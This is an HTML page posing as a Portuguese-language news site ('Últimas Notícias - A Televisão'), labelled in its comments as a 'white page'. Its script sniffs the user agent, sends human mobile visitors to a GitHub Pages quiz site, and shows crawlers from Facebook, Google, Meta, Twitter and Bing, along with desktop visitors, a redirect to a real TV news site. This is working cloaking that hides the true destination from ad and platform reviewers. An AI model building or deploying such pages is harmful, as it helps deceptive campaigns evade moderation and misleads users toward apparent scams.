<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Últimas Notícias - A Televisão</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            color: #d40000;
            border-bottom: 1px solid #d40000;
            padding-bottom: 10px;
        }
    </style>
</head>
<body>
    <!-- PÁGINA WHITE (única página) -->
    <div id="white-page">
        <h1>Últimas Notícias</h1>
        <p>Carregando conteúdo exclusivo...</p>
    </div>

    <!-- SCRIPT OTIMIZADO -->
    <script>
        function isHumanMobile() {
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
            return isMobile && !isBot;
        }

        // Redirecionamento direto para mobile (sem black page)
        if (isHumanMobile()) {
            setTimeout(() => {
                window.location.href = "https://avelino-star.github.io/Quiz/";
            }, 2000); // 2 segundos
        } else {
            setTimeout(() => {
                window.location.href = "https://www.atelevisao.com";
            }, 3000); // 3 segundos
        }
    </script>
</body>
</html>
